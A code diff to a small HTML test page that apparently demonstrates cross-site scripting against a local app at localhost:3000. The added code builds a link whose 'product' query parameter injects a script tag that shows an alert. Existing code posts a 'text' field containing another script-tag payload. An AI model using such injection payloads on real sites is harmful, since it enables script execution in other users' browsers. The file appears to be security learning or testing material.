@@ -7,17 +7,27 @@
     <title>Click Me!</title>
 </head>
 <body>
+    <a id="naiveLink">Click this link!</a>
+    <br>
+    <br>
     <button id="runscript">Click Me!</button>
    <p id="message">You've clicked the button 0 times.</p>
    <script>
     document.addEventListener("DOMContentLoaded", () =>{
+        const scripttag = "script"
+        const params = new URLSearchParams();
+        const hmessage = "\'You have been hacked!\'"
+        params.append("product", `<${scripttag}>alert(${hmessage})</${scripttag}>`)
+        const url = new URL("http://localhost:3000/restricted/product")
+        fullurl = url.toString() + "?" + params.toString()
+        const linkpoint = document.getElementById("naiveLink")
+        linkpoint.setAttribute("href",fullurl)
         let i=0;
         const button = document.getElementById("runscript");
         const message = document.getElementById("message");
         //console.log("button is", button)
         const payload = [];
         const alertmsg = "\"Bad news, you have been hacked!\""
-        const scripttag = "script"
         const badstuff = `This is the bad stuff: <${scripttag}>alert(${alertmsg})</${scripttag}>`
         payload.push(`${encodeURIComponent("title")}=${encodeURIComponent("Surprise!")}`);
         payload.push(`${encodeURIComponent("text")}=${badstuff}`);
